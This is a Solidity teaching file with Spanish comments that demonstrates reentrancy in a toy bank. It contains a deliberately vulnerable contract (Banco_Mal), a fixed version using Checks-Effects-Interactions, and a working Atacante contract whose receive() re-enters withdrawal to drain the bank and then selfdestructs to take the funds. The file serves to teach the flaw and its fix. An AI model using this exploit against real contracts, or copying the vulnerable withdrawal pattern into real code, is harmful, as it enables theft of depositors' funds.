// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

interface Banco {
    function depositar() external payable;
    function retirar(uint cantidad) external;
}

contract Banco_Mal is Banco {

    /// Mapping con los balances de los clientes por su direccion.
    mapping(address => uint) public balances;
    
    /** Balance del banco.
     *  Suma de todos los depositos realizados por todos los clientes.
     *  Util para llamarla desde Remix.
     */ 
    function miBalance() public view returns (uint) {
        return address(this).balance;
    }

    /// msg.sender hace un deposito por importe de msg.value.
    function depositar() override public payable { 
        balances[msg.sender] += msg.value;
    }
    
    /** Retirar fondos.
     *  msg.sender retira parte de los fondos.
     * 
     *  CODIGO ERRONEO: 
     *  Hay un problema de seguridad por reentrada de codigo: 
     *  El contrato al que enviamos los fondos puede volver a 
     *  llamar a retirar.
     *  Con cada llamada le quita dinero al Banco. 
     *  Ese dinero es lo que han depositado todos los clientes.
     */
    function retirar(uint cantidad) override public {
        if (balances[msg.sender] >= cantidad) {
            uint nuevoBalance = balances[msg.sender] - cantidad;
            (bool success,) = msg.sender.call{value: cantidad}("");
            if (success) {
                balances[msg.sender] = nuevoBalance;
            }  
        }
    }
}

contract Banco_OK is Banco {

    /// Mapping con los balances de los clientes por su direccion.
    mapping(address => uint) public balances;
    
    /// msg.sender hace un deposito por importe de msg.value.
    function depositar() override public payable { 
        balances[msg.sender] += msg.value;
    }

    /** Retirar fondos.
     *  msg.sender retira parte de los fondos.
     * 
     *  Evita reentrada usando el patrón Checks-Effects-Interactions.
     * 
     *  Ahora solo puede llevarse unicamente su propio balance.
     */
    function retirar(uint cantidad) override public {
        if (balances[msg.sender] >= cantidad) {
            balances[msg.sender] -= cantidad;
            (bool success,) = msg.sender.call{value: cantidad}("");
            if (!success) {
                revert("No se ha podido hacer la transferencia");
            }   
        }
    }
  
    /** Balance del banco.
     *  Suma de todos los depositos realizados por todos los clientes.
     *  Util para llamarla desde Remix.
     */ 
    function miBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Cliente {

    address payable banco;
    
    constructor(address payable _banco) payable {
        banco = _banco;
    }
    
    /// Ingresar 1 ether.
    function ingresar() payable public { 
        Banco(banco).depositar{value:  1 ether}();
    }
    
    /// Recuperar 1 ether.
    function recuperar() public {
        Banco(banco).retirar(1 ether);
    }
    
    /// Se llama cuando recibo una transferencia.
    receive() external payable {
    }
    
    function miBalance() public view returns (uint) {
        return address(this).balance;
    }
}



contract Atacante {

    address payable banco;
    
    constructor(address payable _banco) payable {
        banco = _banco;
    }
    
    /// Ingresar 1 ether.
    function ingresar() payable public { 
        Banco(banco).depositar{value: 1 ether}();
    }
    

    /// Recuperar 1 ether.
    function recuperar() public {
        Banco(banco).retirar(1 ether);
    }
    
    /** Se llama cuando recibo una transferencia.
     * Provocar una reentrada de codigo para robarle el dinero al banco.
     */
    receive() external payable {
        recuperar();
    }
    
    function miBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    /// Sacar el dinero de este contrato y llevarselo.
    function llevarmelo() public {
        selfdestruct(payable(msg.sender));
    }
}
